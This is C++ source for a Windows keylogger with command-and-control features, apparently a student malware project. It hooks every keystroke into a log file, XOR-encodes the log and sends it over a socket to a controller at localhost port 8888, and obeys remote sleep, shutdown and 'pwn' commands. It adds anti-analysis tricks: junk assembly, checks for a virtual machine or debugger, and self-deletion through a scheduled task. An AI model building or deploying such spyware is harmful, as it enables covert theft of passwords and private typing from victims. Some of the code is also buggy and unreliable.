#ifdef _WIN32
#include <winsock2.h>
#include <Windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "IPHLPAPI.lib")
#elif __linux__
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#endif

#include <iostream>
#include <fstream>
#include <sstream>
#include <winuser.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <ws2tcpip.h>
#include <tchar.h>
#include <thread>
#include <mutex>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

using namespace std;

//global variables
bool active = true;
string DeviceID;
SOCKET sock = INVALID_SOCKET;
mutex mtx;


// Converts key int to string
string KeyToString(int key) {
    switch (key) {
        case VK_RETURN: return "[ENTER]";
        case VK_SPACE: return "[SPACE]";
        case VK_TAB: return "[TAB]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_LSHIFT: return "[L_SHIFT]";
        case VK_RSHIFT: return "[R_SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_LCONTROL: return "[L_CTRL]";
        case VK_RCONTROL: return "[R_CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_LMENU: return "[L_ALT]";
        case VK_RMENU: return "[R_ALT]";
        case VK_CAPITAL: return "[CAPS LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_PRIOR: return "[PAGE UP]";
        case VK_NEXT: return "[PAGE DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT_ARROW]";
        case VK_UP: return "[UP_ARROW]";
        case VK_RIGHT: return "[RIGHT_ARROW]";
        case VK_DOWN: return "[DOWN_ARROW]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_PRINT: return "[PRINT_SCREEN]";
        case VK_PAUSE: return "[PAUSE]";
        case VK_PLAY: return "[PLAY]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default: return string(1, static_cast<char>(key));
    }
}

// Log keystrokes to file
void LogKeystroke(int key) {
    ofstream logfile("keylog.txt", ios_base::app);
    if (logfile.is_open()) {
        logfile << KeyToString(key);
        logfile.close();
    } else {
        cerr << "Failed to open keylog file for writing." << endl;
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        LogKeystroke(kbdStruct->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Encode the message with XOR
string encode(const string& message) {
    char key = '1';
    string encodedMessage = message;
    for (char& c : encodedMessage) {
        c = c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return encodedMessage;
}

//decode incomming messages
string decode(const string& encodedMessage) {
    char key = '1';
    string decodedMessage = encodedMessage;
    for (char& c : decodedMessage) {
        c = c ^ key;
        key = (key << 1) | (key >> 7);
    }
    return decodedMessage;
}

// Send log as a message to C&C
bool sendMessage(const string& message) {
    if (message.size()<100){
        return false;
    }
    string codedMessage = encode(message);
    int iResult = send(sock, codedMessage.c_str(), static_cast<int>(message.length()), 0);
    if (iResult == SOCKET_ERROR) {
        cerr << "send failed with error: " << WSAGetLastError() << endl;
        WSACleanup();
        return false;
    }
    return true;
}

// Display a message to the user
void DisplayMessage() {
    MessageBoxW(NULL, L"Sorry, you've been pwned, for educational purposes!", L"Pwned!", MB_OK | MB_ICONEXCLAMATION);
}

// Handle false command response
void FalseCommandResponse(const string& message) {
    sendMessage("False Command: " + message);
}

// Follow commands received from server
void FollowCommand(const string& command) {
    // applys command to all threads
    lock_guard<mutex> lock(mtx);

    // Initialised variables
    stringstream commandStream(command);
    vector<string> commandSegments;
    string segment;

    // Split command up into segments
    while (getline(commandStream, segment, ' ')) {
        commandSegments.push_back(segment);
    }

    // check if there are the right number of segments
    if (commandSegments.size() < 2 || commandSegments.size() > 3) {
        FalseCommandResponse("Invalid command format. " + command);
        return;
    }

    // Specify the command segment and id segement
    string cmd = commandSegments[0];
    string id = commandSegments[1];

    // run sleep command
    if (cmd == "slp") {
        int n = 5; // Default sleep time
        if (commandSegments.size() == 3) {
            size_t pos;
            n = stoi(commandSegments[2], &pos);
            if (pos != commandSegments[2].size()) {
                FalseCommandResponse("Invalid sleep length. " + command);
                return;
            }
        }

        // Convert seconds to milliseconds
        Sleep(n * 1000); 
    } else if (cmd == "shd") { // run shutdown command
        remove("keylog.txt");
        exit(0);
    } else if (cmd == "pwn") { // run pwn command
        DisplayMessage();
    } else {// respond if command is invalid
        FalseCommandResponse("Unknown command. " + command);
    }
}

// Connect to the server
bool connectToServer() {
    //setup to get sockets to work
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cerr << "WSAStartup failed with error: " << iResult << endl;
        return false;
    }

    // Variable Setup
    struct addrinfo* result = NULL;
    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Comfirm the server address and port (localhost)
    iResult = getaddrinfo("127.0.0.1", "8888", &hints, &result);
    if (iResult != 0) {
        cerr << "getaddrinfo failed with error: " << iResult << endl;
        WSACleanup();
        return false;
    }

    // Connect to address
    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Create Socet at the address
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            cerr << "socket failed with error: " << WSAGetLastError() << endl;
            WSACleanup();
            return false;
        }

        // Connect to server
        iResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            cerr << "connect failed with error: " << WSAGetLastError() << endl;
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    // ake sure malware got connected
    if (sock == INVALID_SOCKET) {
        cerr << "Unable to connect to server!" << endl;
        WSACleanup();
        return false;
    }

    // Give server device id with command to register it and save the socket connection
    string httpRequest = "GET /newClient?id=" + DeviceID + " HTTP/1.1\r\nHost: localhost\r\n\r\n";
    iResult = send(sock, httpRequest.c_str(), static_cast<int>(httpRequest.length()), 0);
    if (iResult == SOCKET_ERROR) {
        cerr << "send failed with error: " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }

    return true;
}

// read the contents of the log file and return as string
string readLogFile(){
    ifstream logfile;
    logfile.open("keylog.txt", ios_base::app);
    
    if (!logfile.is_open()) {
        cerr << "Failed to open keylog file for reading." << endl;
        return "";
    }

    // Determine the file size
    logfile.seekg(0, ios::end);
    int fileSize = logfile.tellg();
    logfile.seekg(0, ios::beg);

    // Allocate a buffer for file contents
    char* buffer = new char[fileSize];
    logfile.read(buffer, fileSize);
    logfile.close();
    
    return buffer;
}

// Delete keylog file
void deleteLog() {
    if (remove("keylog.txt") != 0) {
        cerr << "Failed to delete keylog file." << endl;
    }
}

// Send log file and delete it
void deleteAndSendLog() {
    // comfirm connection
    if (sock == INVALID_SOCKET) {
        cerr << "Failed to connect to server." << endl;
        return;
    }

    if (sendMessage(readLogFile())) {
        deleteLog();
    }
}

// Inserting random instructions that dont do anything to confuse disassemblers
void confuseAnalyst() {
    asm volatile (
        "xor %%eax, %%eax\n\t"  // XOR instruction to clear register
        "nop\n\t"               // No-operation instruction
        "add $0x1, %%eax\n\t"   // Add immediate value to register
        "nop\n\t"               // No-operation instruction
        "sub $0x1, %%eax\n\t"   // Subtract immediate value from register
        :
        :                       // No input operands
        : "eax"                 // Clobbered registers
    );
}

// check if exe us being run inside a virtual machine
bool isInsideVM(){
    HKEY hKey;
    // checks for VMware
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_15AD&DEV_0405&SUBSYS_040515AD&REV_00"), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    // checks for VirtualBox
    result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Enum\\PCI\\VEN_80EE&DEV_CAFE"), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    // not inside a VM
    return false;
}

// delete the currently running exe
void selfDestruct() {
    // delete log file
    remove("keylog.txt");

    // initialise variables
    TCHAR szFileName[MAX_PATH];
    TCHAR szCmd[MAX_PATH];
    TCHAR szTaskName[MAX_PATH] = _T("SelfDeleteTask");

    // Get the file name of the executable
    GetModuleFileName(NULL, szFileName, MAX_PATH);

    // Prepare and exectue the cmd to create a scheduled task to delete the exe
    _stprintf_s(szCmd, MAX_PATH, _T("schtasks /create /tn \"%s\" /tr \"cmd.exe /c del /f /q \\\"%s\\\"\" /sc once /st 00:00 /sd 01/01/2000 /f"), szTaskName, szFileName);
    _tsystem(szCmd);

    // Prepare and execute the command to run the scheduled task
    _stprintf_s(szCmd, MAX_PATH, _T("schtasks /run /tn \"%s\""), szTaskName);
    _tsystem(szCmd);
}

//contains the thread that handles recieving commands
void commandHandelingThread(){
    while (active) {
        char response[4096];
        int bytesRead = recv(sock, response, sizeof(response) - 1, 0);
        if (bytesRead > 0) {
            response[bytesRead] = '\0';
            string decoded =  decode(response);

            // Handle server commands
            FollowCommand(decoded); 
        }
    }
}

// Main function
int main() {
    //delete exe if inside a vm or debugger so it cant be analysed
    if (isInsideVM() || IsDebuggerPresent()){
        selfDestruct();
    }

    // for anti-dissassembly
    confuseAnalyst();

    // Set the keyboard hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        cerr << "Failed to set hook. Error code: " << GetLastError() << endl;
        return 1;
    }

    // Generate random device id
    srand(static_cast<unsigned int>(time(nullptr)));
    int id = rand();
    DeviceID = "Device-" + to_string(id);

    // attempt to connect to C&C server
    if (!connectToServer()) {
        cerr << "Failed to connect to server." << endl;
        return 1;
    }

    // create thread to handle commands so waiting to recieve on doesnt affect the sending of data
    thread commandThread(commandHandelingThread);

    // handle how often to sen data
    int i = 0;
    MSG msg;

    // send data perodically and log any key strokes
    while (active) {
        i += 1;
        if (i == 1000000) {
            i = 0;
            deleteAndSendLog();
        }

        // read and log any key strokes
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
        }
    }

    // Cleanup
    active = false;
    commandThread.join();
    closesocket(sock);
    WSACleanup();
    return 0;
}
